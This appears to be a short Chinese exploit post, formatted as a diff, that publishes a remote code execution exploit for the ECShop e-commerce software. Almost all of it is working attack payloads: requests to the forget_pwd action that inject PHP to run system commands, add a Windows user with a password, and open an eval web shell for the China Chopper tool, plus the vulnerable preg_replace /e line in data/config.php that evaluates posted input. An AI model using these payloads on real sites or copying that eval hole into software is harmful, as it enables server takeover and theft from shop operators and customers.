@@ -1,0 +1,20 @@
+ecshop远程代码执行漏洞exp发布:koohik | 发布时间: 2012年8月13日 
+ecshop 版本不祥 貌似09
+
+system 权限
+ act=forget_pwd&action=get_pwd&email=${@print(system('net user'))}&user_name=furybijj
+无果
+去掉system之后改%60
+ act=forget_pwd&action=get_pwd&email=$%7B@print(%60net user SUPPORT_388945a1 lifelongz%60)%7D&user_name=furybijj
+果断成功
+其实这个也可以直接用菜刀 connect.
+在配置里写下：
+www.koohik.com
+ <O>act=forget_pwd&action=get_pwd&email=${eval($_POST[test])}&user_name=furybijj</O>
+主要利用代码如下：
+ act=forget_pwd&action=get_pwd&email=%24%7b%40print%28%60net%20user%60%29%7d&user_name=furybijj
+ act=forget_pwd&action=get_pwd&email=%24%7b%40eval%28%24_POST%5bfuck%5d%29%7d&user_name=furybijj
+漏洞的原因是
+data/config.php
+ define('EC_CHARSET','utf-8');
+@preg_replace("/[email]/e",$_POST['email'],"error");
